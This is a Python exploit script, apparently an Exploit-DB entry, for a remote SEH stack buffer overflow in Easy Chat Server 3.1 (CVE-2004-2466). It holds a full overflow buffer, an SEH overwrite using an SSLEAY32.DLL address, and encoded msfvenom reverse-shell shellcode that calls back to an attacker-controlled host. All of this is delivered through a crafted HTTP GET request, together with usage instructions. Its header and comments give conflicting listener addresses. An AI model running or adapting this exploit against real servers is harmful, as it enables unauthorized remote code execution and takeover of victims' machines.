# Exploit Title: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
# Exploit Author: r00tpgp @ http://www.r00tpgp.com
# Usage: python easychat-exploit.py <victim-ip> <port>
# Spawns reverse meterpreter LHOST=192.168.0.162 LPORT=1990
# CVE: CVE-2004-2466 
# Installer: http://www.echatserver.com/
# Tested on: Microsoft Windows 11 Pro x86-64 (10.0.22000 N/A Build 22000)

#!/usr/bin/python3

import sys
import socket
from struct import pack

host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user

junk = b"A" * 217
nseh = pack("<L", 0x06eb9090)  # short jump 6 bytes
seh = pack("<L", 0x1001ae86)  # pop pop ret 1001AE86 SSLEAY32.DLL

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.228 LPORT=4444 -f python -b "\x00\x20" -v shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.228 LPORT=4444 -f python -b "\x00\x20" -v shellcode
shellcode = b"\x90" * 16
shellcode += b"\xbf\x9c\x84\x90\xc3\xda\xdc\xd9\x74\x24\xf4"
shellcode += b"\x5a\x2b\xc9\xb1\x52\x31\x7a\x12\x83\xc2\x04"
shellcode += b"\x03\xe6\x8a\x72\x36\xea\x7b\xf0\xb9\x12\x7c"
shellcode += b"\x95\x30\xf7\x4d\x95\x27\x7c\xfd\x25\x23\xd0"
shellcode += b"\xf2\xce\x61\xc0\x81\xa3\xad\xe7\x22\x09\x88"
shellcode += b"\xc6\xb3\x22\xe8\x49\x30\x39\x3d\xa9\x09\xf2"
shellcode += b"\x30\xa8\x4e\xef\xb9\xf8\x07\x7b\x6f\xec\x2c"
shellcode += b"\x31\xac\x87\x7f\xd7\xb4\x74\x37\xd6\x95\x2b"
shellcode += b"\x43\x81\x35\xca\x80\xb9\x7f\xd4\xc5\x84\x36"
shellcode += b"\x6f\x3d\x72\xc9\xb9\x0f\x7b\x66\x84\xbf\x8e"
shellcode += b"\x76\xc1\x78\x71\x0d\x3b\x7b\x0c\x16\xf8\x01"
shellcode += b"\xca\x93\x1a\xa1\x99\x04\xc6\x53\x4d\xd2\x8d"
shellcode += b"\x58\x3a\x90\xc9\x7c\xbd\x75\x62\x78\x36\x78"
shellcode += b"\xa4\x08\x0c\x5f\x60\x50\xd6\xfe\x31\x3c\xb9"
shellcode += b"\xff\x21\x9f\x66\x5a\x2a\x32\x72\xd7\x71\x5b"
shellcode += b"\xb7\xda\x89\x9b\xdf\x6d\xfa\xa9\x40\xc6\x94"
shellcode += b"\x81\x09\xc0\x63\xe5\x23\xb4\xfb\x18\xcc\xc5"
shellcode += b"\xd2\xde\x98\x95\x4c\xf6\xa0\x7d\x8c\xf7\x74"
shellcode += b"\xd1\xdc\x57\x27\x92\x8c\x17\x97\x7a\xc6\x97"
shellcode += b"\xc8\x9b\xe9\x7d\x61\x31\x10\x16\x4e\x6e\x37"
shellcode += b"\x02\x26\x6d\x47\xdb\xeb\xf8\xa1\xb1\x03\xad"
shellcode += b"\x7a\x2e\xbd\xf4\xf0\xcf\x42\x23\x7d\xcf\xc9"
shellcode += b"\xc0\x82\x9e\x39\xac\x90\x77\xca\xfb\xca\xde"
shellcode += b"\xd5\xd1\x62\xbc\x44\xbe\x72\xcb\x74\x69\x25"
shellcode += b"\x9c\x4b\x60\xa3\x30\xf5\xda\xd1\xc8\x63\x24"
shellcode += b"\x51\x17\x50\xab\x58\xda\xec\x8f\x4a\x22\xec"
shellcode += b"\x8b\x3e\xfa\xbb\x45\xe8\xbc\x15\x24\x42\x17"
shellcode += b"\xc9\xee\x02\xee\x21\x31\x54\xef\x6f\xc7\xb8"
shellcode += b"\x5e\xc6\x9e\xc7\x6f\x8e\x16\xb0\x8d\x2e\xd8"
shellcode += b"\x6b\x16\x5e\x93\x31\x3f\xf7\x7a\xa0\x7d\x9a"
shellcode += b"\x7c\x1f\x41\xa3\xfe\x95\x3a\x50\x1e\xdc\x3f"
shellcode += b"\x1c\x98\x0d\x32\x0d\x4d\x31\xe1\x2e\x44"


buffer = b"GET /chat.ghp?username=" + junk + nseh + seh + shellcode + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
# buffer += b"Host: 192.168.1.136:80\r\n"
buffer += b"Host: 192.168.158.213:20000\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
# buffer += b"Referer: http://192.168.1.136\r\n"
buffer += b"Referer: http://192.168.158.213\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")


# Mr.Tree
# python3 50999.py 192.168.158.213 20000
